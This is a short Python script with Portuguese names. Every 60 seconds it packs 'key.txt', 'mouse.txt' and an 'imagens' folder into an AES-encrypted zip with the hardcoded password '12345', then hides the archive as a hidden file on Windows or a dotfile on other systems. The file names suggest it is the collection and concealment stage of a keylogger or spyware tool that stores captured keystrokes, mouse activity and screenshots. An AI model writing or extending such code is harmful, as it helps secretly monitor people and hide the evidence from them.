import pyzipper
import os
import platform
import time
from datetime import datetime

def adicionar_pasta_ao_zip(zf, pasta, caminho_relativo=""):
    for item in os.listdir(pasta):
        caminho_completo = os.path.join(pasta, item)
        caminho_relativo_completo = os.path.join(caminho_relativo, item)
        if os.path.isdir(caminho_completo):
            adicionar_pasta_ao_zip(zf, caminho_completo, caminho_relativo_completo)
        else:
            zf.write(caminho_completo, caminho_relativo_completo)

while True:
    arquvio_zip = "Secret.zip"

    if os.path.exists(arquvio_zip):
            os.remove(arquvio_zip)

    with pyzipper.AESZipFile(arquvio_zip, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(b'12345')
        zf.write("key.txt", "key.txt")
        zf.write("mouse.txt", "mouse.txt")
        adicionar_pasta_ao_zip(zf, "imagens")

    # Verificação se é Linux ou Windows
    if platform.system() == "Windows":
        os.system(f'attrib +h "{arquvio_zip}"')
    else:
        arquivo_oculto = f".{arquvio_zip}"
        os.rename("Secret.zip", ".Secret.zip")
    
    time.sleep(60)